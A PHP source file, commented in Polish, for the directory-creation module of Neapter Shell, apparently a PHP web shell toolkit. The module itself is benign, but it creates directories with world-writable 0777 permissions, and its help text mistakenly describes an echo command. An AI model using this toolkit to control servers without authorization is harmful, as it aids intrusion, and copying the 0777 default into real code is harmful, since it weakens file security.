<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Tworzenie katalogu
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleMkdir extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array('mkdir');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.1 2016-06-08 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Wyświetla tekst

	Użycie:
		echo tekst do wyświetlenia
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        $iParams = $this->oArgs->getNumberOfParams();

        if ($iParams === 0) {
            return self::getHelp();
        }

        $sOutput = '';

        for ($i = 0; $i < $iParams; ++$i) {
            $sPathName = $this->oArgs->getParam($i);

            $sOutput .= sprintf(
                "Katalog \"%s\" %szostał utworzony\r\n",
                $sPathName,
                (! @mkdir($sPathName, 0777, true) ? 'nie ' : '')
            );
        }

        return $sOutput;
    }
}
